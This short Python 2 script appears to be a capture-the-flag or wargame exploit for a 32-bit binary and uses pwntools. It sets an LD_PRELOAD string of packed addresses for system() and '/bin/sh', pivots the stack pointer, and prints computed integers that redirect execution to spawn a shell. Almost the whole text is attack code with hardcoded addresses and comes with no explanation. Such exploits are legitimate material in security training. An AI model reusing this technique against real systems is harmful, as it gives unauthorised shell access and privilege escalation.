#!/usr/bin/env python

# ulimit -s unlimited
# export LD_PRELOAD="$(perl -e 'print "\xb0\xa0\x5c\x55aaaa\x40\xbc\x6e\x55"')"

# system: 0x555ca0b0
# /bin/sh: 0x556ebc40

import os
from pwn import *

def adjust_addr(addr):
    if addr >= 2147483648:
        return addr - 2147483648*2
    return addr

# -81 ~ -96
print "-96" # move esp to 0xffffdc70

# 2400483
print "%d" % adjust_addr((0x5557b857 + 4) ^ 1433606328) # ld_preload
